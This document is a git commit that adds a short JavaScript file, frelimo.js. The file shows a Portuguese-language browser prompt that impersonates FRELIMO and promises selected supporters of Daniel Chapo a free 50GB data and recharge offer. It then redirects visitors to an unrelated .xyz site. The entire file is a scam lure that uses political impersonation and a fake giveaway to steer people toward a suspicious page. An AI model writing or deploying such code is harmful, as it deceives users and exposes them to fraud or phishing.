5a0be3a01d27222ca5d3192c0847f514a917e47c
bigetijazz9 <bigetijazz9@gmail.com>
2024-10-21 22:24:07 -0700

    Create frelimo.js

---
+++ frelimo.js
@@ -0,0 +1,6 @@
+
+var password = 'ATIVAR 50GB + RECARREGAR'
+password=prompt('FRELIMO: Olá, está entre os Apoiantes Daniel Chapo selecionados para beneficiar desta oferta. Prima OK para receber uma oferta agora','ATIVAR 50GB + RECARREGAR');
+if (password != 'ATIVAR 50GB + RECARREGAR') {
+location.href='https://www.get-mega-offre.xyz/50gb-oferta';
+}
